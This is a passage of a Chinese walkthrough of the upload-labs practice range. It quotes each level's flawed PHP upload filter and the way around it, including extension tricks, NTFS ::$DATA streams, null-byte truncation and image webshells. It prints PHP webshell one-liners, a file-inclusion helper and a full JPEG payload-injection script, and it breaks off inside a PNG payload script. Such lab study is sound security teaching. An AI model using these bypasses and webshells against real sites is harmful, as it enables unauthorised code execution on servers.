array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 防御机制后端程序使用黑名单过滤大部分文件后缀名，但未对文件后缀名进行大小写转换处理。 绕过方法对后缀名进行大小写转换，如Php、phP即可绕过。 0x06 Pass-06 利用空格绕过查看提示/源码正常上传文件，提示不允许上传该文件。 查看提示，过滤了大多数的后缀，同Pass-05： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ 查看源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 防御机制后端程序使用黑名单过滤大部分文件后缀名，但未对文件名进行去空处理。 绕过方法直接在.php后缀名后面加个空格即可。 0x07 Pass-07 利用.绕过查看提示/源码正常上传文件，提示不允许上传该文件。 查看提示： 本pass禁止上传所有可以解析的后缀！ 查看源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 防御机制后端程序使用黑名单过滤大部分文件后缀名，但未调用deldot()函数过滤文件名末尾的“.”。 绕过方法利用Windows会自动去掉后缀名中最后的”.”的特性，直接在.php后缀名后面加个“.”即可。 0x08 Pass-08 利用::$DATA绕过查看提示/源码正常上传文件，提示不允许上传该文件。 查看源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 防御机制后端程序使用黑名单过滤大部分文件后缀名，但未过滤字符串“::$DATA”。 绕过方法利用Windows文件流特性绕过，直接在.php后缀名后面加上空格拼接的字符串“ ::$DATA”即可。 知识点： NTFS是Windows中为了解决网络和磁盘配额、文件加密等安全特性所设计的磁盘格式，比FAT文件系统更加稳定、更为安全。NTFS-ADS又称为NTFS交换数据流，是NTFS磁盘格式的一个特性。 在NTFS文件系统下，每个文件都可以存在多个数据流，即除了主文件外，还可以有很多非主文件流寄宿在主文件流中。 格式如下：&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt; 当我们上传一个shell.php:jpg文件时，该流类型是以$开头，默认流类型为data，而其完整格式为shell.php:jpg:$data。上传成功后会看到上传目录生成了一个shell.php文件，但内容为空。 如图： 通过dir /a /r命令可以看到生成x.php:jpg:$DATA数据流文件： 然而我们上传的文件是数据流文件且文件内容都在数据流文件中，之所以会生成x.php文件时因为它没有找到自己的宿主文件才创建了一个空的宿主文件。 同理，若我们上传文件名改为shell.php::$DATA就可以写入文件了，场景就是本题的绕过利用部分。至于为啥写入成功，这是因为在数据流中指定了唯一的文件名shell.php，并且指定了数据流为$DATA，因此数据流文件就能找到宿主文件shell.php并直接往上面写内容。 简单地说，本题绕过情景是：在Windows环境下，如果文件名后面拼接了::$DATA，则会把::$DATA之后的数据当成文件流处理而不是文件后缀名，并且保持::$DATA之前的文件名不变，因此在Windows的场景下可以用来绕过黑名单后缀名过滤。 下表将数据流文件上传进行了小结： 上传的文件名 服务器表面现象 生成的文件内容 shell.php:a.jpg 生成shell.php 空 shell.php::$DATA 生成shell.php &lt;?php @eval($_GET[&#39;c&#39;]);?&gt; shell.php::$INDEX_ALLOCATION 生成shell.php文件夹 无 shell.php::$DATA.jpg 生成0.jpg &lt;?php @eval($_GET[&#39;c&#39;]);?&gt; shell.php::$DATA\\a.jpg 生成a.jpg &lt;?php @eval($_GET[&#39;c&#39;]);?&gt; 具体可参考：https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream 0x09 Pass-09 利用.+空格+.绕过查看提示/源码正常上传文件，提示不允许上传该文件。 查看源码，黑名单过滤并和前面的相比未漏掉某步的处理，但新文件路径直接拼接文件名而非重命名生成的，此情景同Pass-04和Pass-07： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 防御机制后端程序使用黑名单过滤大部分文件后缀名，但新建文件路径直接拼接文件名而非重命名。 绕过方法直接使用原来的文件名拼接，虽然对后缀名进行了去点和删空格的处理，但该处理只是处理一次，未对文件名进行遍历处理，因此我们可以构造如shell.php. .（’.’+空格+’.’），接下来的处理过程如下： 1234567891011121314151617$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);//&apos;shell.php. .&apos;$file_name = deldot($file_name);//删除文件名末尾的点//&apos;shell.php. &apos;$file_ext = strrchr($file_name, &apos;.&apos;);//&apos;. &apos;$file_ext = strtolower($file_ext); //转换为小写//&apos;. &apos;$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA//&apos;. &apos;$file_ext = trim($file_ext); //首尾去空//&apos;.&apos; 最后，$file_ext为’.’，绕过了后缀名黑名单的过滤；而$img_path直接拼接的值为/upload/shell.php. .，这就和Pass-07一样了，利用Windows会自动去掉后缀名中最后的”.”的特性可以直接绕过成功上传。 0x0A Pass-10 利用嵌套绕过查看提示/源码正常上传文件，能上传成功，但保存的文件后缀名php被过滤了。 查看源码： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 防御机制后端程序使用黑名单过滤大部分文件后缀名，具体处理是直接删掉在黑名单中的后缀名。 绕过方法虽然进行了删除，但仅限于一次，可以以嵌套的方式绕过，如shell.phphpp。 0x0B Pass-11 利用%00截断绕过查看提示/源码正常上传文件，提示只能允许上传.jpg|.png|.gif类型文件。 查看源码： 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 防御机制后端程序使用白名单过滤限定文件后缀名只能为jpg/png/gif，但文件保存路径外部可控。 绕过方法可以在save_path参数处使用%00截断，但需要满足下面两个前提条件： PHP版本 &lt; 5.3.4； PHP的魔术引号即magic_quotes_gpc为Off关闭状态； phpStudy中有5.2.17版本的PHP，切换到该版本并到php.ini中设置magic_quotes_gpc = Off即可配置好环境： 0x0C Pass-12 利用0x00截断绕过%00截断和0x00截断原理是一样的，区别只是%00截断是URL编码的表现、用于GET方式，而0x00截断则是二进制编码的表现、用于其他如POST方式。 和Pass-11一样，绕过方法也是一直的，只不过save_path参数从GET改成POST方式了。 但由于POST不会像GET一样自动对URL编码进行解码，因此需要我们在Hex中直接进行二进制修改为00： 手动到Hex解密改有些麻烦，我们可以借助Burp自带的URL解码功能来实现： 0x0D Pass-13 利用图片马绕过文件头检测查看提示/源码如下描述，要求上传图片马，如果想利用成功的话需要结合文件包含漏洞才行： 任务 上传图片马到服务器。 注意： 1.保证上传后的图片马中仍然包含完整的一句话或webshell代码。 2.使用文件包含漏洞能运行图片马中的恶意代码。 3.图片马要.jpg,.png,.gif三种后缀都上传成功才算过关！ 查看源码： 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 防御机制通过读文件的前2个字节判断文件类型，即对文件头进行检测。 绕过方法要绕过的话需要在文件开头写上检测的值，有现成的Windows命令和手工两种方法。 更多的可参考本Lab靶场作者的博客：图片木马制作大法 1、Windows命令 在Windows下使用如下命令可制作图片一句话木马： copy normal.jpg /b + shell.php /a webshell.jpg 用WinHex打开生成的图片马就可以看到插入的PHP代码了： 为了检测图片马是否能正常利用，这里在upload目录中放置个文件包含文件，i.php： 1&lt;?php @include($_GET['file']);?&gt; 2、手工添加文件头 针对文件头的检测，我们可以手工添加各种格式文件的文件头来绕过。 比如图片类型的文件幻数如下： JPG文件： GIF文件： PNG文件： 然后在文件幻数后面加上代码即可。 下面直接在Burp中拦截报文手工在Hex栏中在PHP木马代码前添加上JPG的文件头： 发送报文，同样成功上传和利用： 0x0E Pass-14 利用图片马绕过getimagesize()和image_type_to_extension()查看提示/源码描述同Pass-13，但webshell.jpg图片马上传不成功。 查看源码： 12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 发现和Pass-13的区别是调用了getimagesize()函数和image_type_to_extension()函数。 getimagesize()函数的返回结果类型是个数字，其中索引2表示的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM。 而image_type_to_extension()函数则根据图像类型返回对应的后缀名。 防御机制通过调用getimagesize()函数和image_type_to_extension()函数获取图像类型来设置后缀名。 绕过方法和Pass-13一样用图片马直接可以解决。但我本地之前在Pass-13用的图片马是不能正常显示图片的（不能正常显示的图片一般是不算图片马），导致在本关无法成功上传绕过，因此需要换个图片或者后门php文件来生成能够正常显示的图片马才能成功： 注意最后根据文件类型生成的JPG文件的后缀名为JPEG而非JPG： 0x0F Pass-15 利用图片马绕过exif_imagetype()查看提示/源码描述同Pass-13/14。 查看源码，发现需要开启php_exif模块才能正常调用exif_imagetype()函数进行图像类型判断： 1234567891011121314151617181920212223242526272829303132333435function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; exif_imagetype()：读取一个图像的第一个字节并检查其签名。 防御机制通过调用exif_imagetype()函数来判断图像类型。 绕过方法同样用图片马可成功绕过上传。 这里先用Pass-13中生成的图片马webshell.jpg，前面知道它并不能正常显示，在Pass-14中并不能利用成功，但这里尝试发现能够上传成功： 能成功利用： 再上传Pass-14的图片马phpinfo.jpg，没毛病： 至此，我们发现：通过调用exif_imagetype()函数判断图像类型的方法更具有容错性、能够对无法正常显示的图片马进行正常处理；而通过调用getimagesize()函数和image_type_to_extension()函数来获取图像类型并设置后缀名的方法是没办法对无法正常显示的图片马进行正常处理的。 0x10 Pass-16 二次渲染绕过查看提示/源码描述同Pass-13/14/15。 尝试之前的webshell.jpg不能上传成功，phpinfo.jpg能上传成功但不能成功利用。 查看源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125; imagecreatefromjpeg()：由文件或URL创建一个新图象。 防御机制严格判断文件后缀名是否为jpg/png/gif、Content-Type是否为对应的图像类型，最后调用imagecreatefromjpeg()等函数对图像进行二次编译即进行了二次渲染。 绕过方法同样用图片马可成功绕过上传，但需要对图像未进行二次编译的位置进行分析，再往该位置插入恶意PHP代码。不同图像类型的插入方式有区别。 JPG先把之前的图片马phpinfo.jpg上传，得到二次渲染后的图片，然后调用下面的脚本对其进行PHP恶意代码的插入，当然这里payload我写的是phpinfo()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"&lt;?php phpinfo();?&gt;\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123; die('php-gd is not installed'); &#125; if(!isset($argv[1])) &#123; die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); &#125; set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die('Incorrect SOI marker'); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage('payload_'.$argv[1], $outStream)) &#123; die('Success!'); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die('End Of File'); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die('End Of File'); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 将插入恶意代码的图片马上传上去： 可以发现能够成功利用： 用WinHex看确实是插入到JPG文件中间部分，且二次渲染并未去掉该部分： GIFGIF图片就简单多了，因其图像结构比较方便我们直接插入恶意代码。原理就是上传一张正常的GIF图或GIF图片马，通过对比二次渲染后的图像和原图像哪些部分未改变，直接在该部分插入我们的恶意PHP代码即可。 这里我先上传一个正常的GIF图： 将上传后经过二次渲染的图片下载下来，用WinHex打开进行比较，找到一些和原图像一样的区域： 直接在WinHex上插入PHP恶意代码： 保存之后，上传该修改后的图片，能够成功利用： PNG网上说的PNG图像绕过二次渲染的方法有两种，一种是写入PLTE数据块，另一种是写入IDAT数据块。 第一种方法——写入PLTE数据块：只针对索引彩色图像的PNG图片有效，在选取PNG图片时可根据IHDR数据块的color type辨别，其中03为索引彩色图像。因该方法的局限性这里就先不演示了。 第二种方法——写入IDAT数据块，直接有脚本可以用，目的是向PNG图片的IDAT数据块中插入PHP后门代码&lt;?=$_GET[0]($_POST[1]);?&gt;： 12345678910111213141516171819202122&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y 